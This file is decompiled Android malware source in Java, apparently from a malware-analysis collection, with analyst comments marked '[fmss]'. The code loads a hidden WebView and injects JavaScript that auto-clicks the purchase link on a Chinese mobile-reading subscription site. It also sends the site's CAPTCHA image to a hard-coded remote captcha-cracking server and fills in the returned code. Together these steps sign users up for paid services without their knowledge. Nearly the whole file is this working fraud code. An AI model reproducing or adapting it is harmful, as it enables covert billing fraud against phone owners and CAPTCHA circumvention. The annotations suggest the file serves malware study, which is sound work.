package com.amaz.onib;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.yf.y.f.init.util.ConstUtils;
import com.yuanlang.pay.plugin.libs.z;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
/* loaded from: classes.dex */
public class bo {

    /* renamed from: a  reason: collision with root package name */
    private static Map<String, WebView> f688a = new HashMap();

    /* loaded from: classes.dex */
    public interface a {
        void a(WebView webView, h hVar, int i, String str);
    }

    /* loaded from: classes.dex */
    public static final class b {

        /* renamed from: a  reason: collision with root package name */
        WebView f692a;
        h b;
        a c;
        private boolean e = false;
        Handler d = new Handler() { // from class: com.amaz.onib.bo.b.1
            @Override // android.os.Handler
            public void handleMessage(Message message) {
                if (message.what == 1000) {
                    bs.b("未进入预订流程");
                    b.this.a(900, (String) message.obj);
                }
            }
        };

        public b(WebView webView, h hVar, a aVar) {
            this.f692a = webView;
            this.b = hVar;
            this.c = aVar;
        }

        public synchronized void a(int i, String str) {
            if (this.c != null && !this.e) {
                if (i != 902) {
                    this.e = true;
                }
                if (by.a(str)) {
                    str = this.f692a.getUrl();
                }
                this.c.a(this.f692a, this.b, i, str);
            }
        }

        @JavascriptInterface
        public void fail(String str) {
            Message message = new Message();
            message.what = 1000;
            message.obj = str;
            this.d.sendMessage(message);
        }
    }

    //[fmss] Creation of webView in which the malicious javaScript code will be inject in order to subscribe the user to a paid service. loadUrl method execute javaSctipt code automatically
    public static void a(Context context, h hVar, a aVar) {
        final String str = context.getCacheDir() + File.separator + "." + hVar.z + File.separator;
        new File(str).mkdir();
        WebView webView = new WebView(context); // [fmss] create webView
        webView.setTag(false);
        f688a.put(hVar.z, webView);
        webView.getSettings().setJavaScriptEnabled(true); //[fmss] enable javaScript code injection
        webView.loadUrl(hVar.r);
        final b bVar = new b(webView, hVar, aVar);
        webView.addJavascriptInterface(bVar, "jsjava"); //[fmss] create javaScriptInterface to inject JavaScript code in webView
        webView.setWebViewClient(new WebViewClient() { // from class: com.amaz.onib.bo.1
            @Override // android.webkit.WebViewClient
            public void onPageFinished(final WebView webView2, final String str2) { //[fmss] override of onPageFinished method to activate paid subscription
                super.onPageFinished(webView2, str2);
                final String str3 = str + "tyt" + System.currentTimeMillis() + ".mht";
                webView2.saveWebArchive(str3, false, new ValueCallback<String>() { // from class: com.amaz.onib.bo.1.1
                    /* renamed from: a */
                    public void onReceiveValue(String str4) {
                        String a2 = bq.a(str3);
                        if (str2.startsWith("http://wap.tyread.com/baoyueInfoListAction.action")) { //[fmss] url of paid subscription website
                            if (a2.contains("=E5==B7=B2=E5=8C=85=E6=9C=88")) {
                                bs.b("已包月");
                                webView2.stopLoading();
                                bVar.a(903, a2);
                            } else if (a2.contains("=E5==B7=B2=E9=80=80=E8=AE=A2,=E6=AC=A1=E6=9C=88=E7=94=9F=E6=95=88")) {
                                bs.b("已退订,次月生效");
                                webView2.stopLoading();
                                bVar.a(904, a2);
                            } else {
                                StringBuffer stringBuffer = new StringBuffer("var newscript = document.createElement('script');"); //[fmss] create a javaScript code to inject
                                stringBuffer.append("newscript.innerHTML = '");
                                stringBuffer.append("var allInputs = document.getElementsByTagName(\\'a\\');");
                                stringBuffer.append("var _r = 0;");
                                stringBuffer.append("for (var i=0;i<allInputs.length;i++){");
                                stringBuffer.append("inp = allInputs[i];");
                                stringBuffer.append("if(inp.outerHTML.indexOf(\\'goPreBuySubmit.action\\')>0){");
                                stringBuffer.append("_r = 1; inp.click();");//[fmss] automatically click on a specific tag
                                stringBuffer.append("}");
                                stringBuffer.append("}");
                                stringBuffer.append("if(_r==0){ jsjava.fail(document.documentElement.outerHTML);}");
                                stringBuffer.append("';");
                                stringBuffer.append("document.body.appendChild(newscript);");
                                webView2.loadUrl("javascript:" + stringBuffer.toString()); //execute javaScript code
                            }
                        } else if (str2.startsWith("http://wap.tyread.com/goPreBuySubmit.action")) {
                            bo.b(webView2, str4, a2, bVar);
                        } else if (str2.startsWith("http://wap.tyread.com/gossourl.action")) {
                            webView2.stopLoading();
                            if (a2.contains("=E5=8C=85=E6=9C=88=E6=88=90=E5=8A=9F")) {
                                bs.b("包月成功");
                                bVar.a(z.b, a2);
                                return;
                            }
                            bs.b("包月失败" + str3);
                            bVar.a(905, a2);
                        } else {
                            bVar.a(900, a2);
                        }
                    }
                });
            }

            @Override // android.webkit.WebViewClient
            public boolean shouldOverrideUrlLoading(WebView webView2, String str2) {
                webView2.loadUrl(str2);
                return true;
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Type inference failed for: r0v0, types: [com.amaz.onib.bo$2] */

    //[fmss] Create an HTTP connection on remote IP in order to make a POST request that will activate the onPostExecute method.
    //[fmss] The onPostExecute method create and execute malicious JavaScript code with loadUrl method
    public static void b(final WebView webView, final String str, final String str2, final b bVar) {
        new AsyncTask<Void, Void, String>() { // from class: com.amaz.onib.bo.2
            /* JADX INFO: Access modifiers changed from: protected */
            /* renamed from: a */
            public String doInBackground(Void... voidArr) {
                String str3;
                boolean z = true;
                try {
                    FileReader fileReader = new FileReader(str);
                    BufferedReader bufferedReader = new BufferedReader(fileReader);
                    StringBuffer stringBuffer = new StringBuffer();
                    z = false;
                    while (true) {
                        String readLine = bufferedReader.readLine();
                        if (readLine == null) {
                            break;
                        } else if (!readLine.startsWith("Content-Location: http://wap.tyread.com/identifyingCode")) {
                            if (readLine.startsWith("------")) {
                                z = false;
                            }
                            if (z) {
                                stringBuffer.append(readLine);
                            }
                        }
                    }
                    fileReader.close();
                    str3 = stringBuffer.toString();
                } catch (Exception e) {
                    e.printStackTrace();
                    str3 = null;
                }
                if (TextUtils.isEmpty(str3)) {
                    return null;
                }
                try { //[fmss] setUp of the HTTP connection on remote ip with POST request
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://139.129.132.111:8001/CrackCaptcha/GetCaptchaValue.aspx").openConnection();
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoInput(true);
                    httpURLConnection.setDoOutput(true);
                    OutputStream outputStream = httpURLConnection.getOutputStream();
                    outputStream.write(("PIC=" + URLEncoder.encode(str3, "UTF-8")).getBytes());
                    outputStream.flush();
                    outputStream.close();
                    if (httpURLConnection.getResponseCode() != 200) {
                        return null;
                    }
                    InputStream inputStream = httpURLConnection.getInputStream();
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    byte[] bArr = new byte[ConstUtils.KB];
                    while (true) {
                        int read = inputStream.read(bArr);
                        if (read != -1) {
                            byteArrayOutputStream.write(bArr, 0, read);
                        } else {
                            inputStream.close();
                            byteArrayOutputStream.close();
                            return n.a(new String(byteArrayOutputStream.toByteArray())).d;
                        }
                    }
                } catch (IOException e2) {
                    e2.printStackTrace();
                    return null;
                }
            }

            /* JADX INFO: Access modifiers changed from: protected */
            /* renamed from: a */
            public void onPostExecute(String str3) { //[fmss] create a javaScript code to load before the connection's load
                if (str3 != null) {
                    StringBuffer stringBuffer = new StringBuffer("var newscript = document.createElement('script');");
                    stringBuffer.append("newscript.innerHTML = '");
                    stringBuffer.append("function setCode(obj){document.getElementById(\\'pic_code\\').value=obj;}"); //[fmss]create function setCode
                    stringBuffer.append("function setMMSCode(obj){document.getElementById(\\'code\\').value=obj;}");
                    stringBuffer.append("var allInputs = document.getElementsByTagName(\\'input\\');");
                    stringBuffer.append("for (var i=0;i<allInputs.length;i++){");
                    stringBuffer.append("inp = allInputs[i];");
                    stringBuffer.append("if(inp.outerHTML.indexOf(\\'getYZM(this)\\')>0){");
                    stringBuffer.append("inp.click();");
                    stringBuffer.append("}");
                    stringBuffer.append("}");
                    stringBuffer.append("';");
                    stringBuffer.append("document.body.appendChild(newscript);");
                    webView.loadUrl("javascript:" + stringBuffer.toString());
                    webView.loadUrl("javascript:setCode(\"" + str3 + "\")");
                    bVar.a(902, str2);
                    return;
                }
                bVar.a(901, str2);
            }
        }.execute(new Void[0]);
    }
}
